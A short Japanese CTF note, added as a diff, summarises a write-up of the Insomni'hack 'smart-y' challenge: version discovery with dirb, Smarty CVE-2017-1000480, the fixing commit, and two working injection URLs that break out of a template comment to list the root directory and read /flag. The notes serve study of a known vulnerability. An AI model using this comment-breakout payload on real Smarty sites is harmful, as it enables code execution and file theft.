@@ -1,0 +1,28 @@
+とけず。
+
+writeup要約
+https://ctftime.org/writeup/8552
+dirb (kaliについてるらしい) を実行すると changelog.txt ファイルなるものが該当ディレクトリに存在していて、そこから php のFW である Smarty のver が 3.1.32 であるとわかる。
+これらの情報をもとに、https://www.cvedetails.com/cve/CVE-2017-1000480/ の情報に行きつく。
+その内容は、Smartyのgithubを探って、 https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61  であるとわかる。
+コミット内容で肝となるのは以下、
+----------------------------------------------------------------------------------------------------------------------
+-        $output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") .
+-                   "\n  from \"" . $_template->source->filepath . "\" */\n\n";
++        $output .= "/* Smarty version {Smarty::SMARTY_VERSION}, created on " . strftime("%Y-%m-%d %H:%M:%S") .
++                   "\n  from \"" . str_replace('*/','* /',$_template->source->filepath) . "\" */\n\n";
+----------------------------------------------------------------------------------------------------------------------
+
+CVEの報告を見ると、fetch() display()で脆弱性が出るらしい。
+今回はその display()を使用している。
+これはテンプレート？なるものを表示してくれる関数らしい。
+
+ためしに、
+http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*
+と実行する。
+これで、 var_dump(scandir('/'));
+このコマンドで該当ディレクトリ配下のファイルが見れる。
+それらみると flag というファイルがあるので、
+http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*
+（実質 var_dump(file_get_contents("/flag"));）
+と打って、フラグをえる。
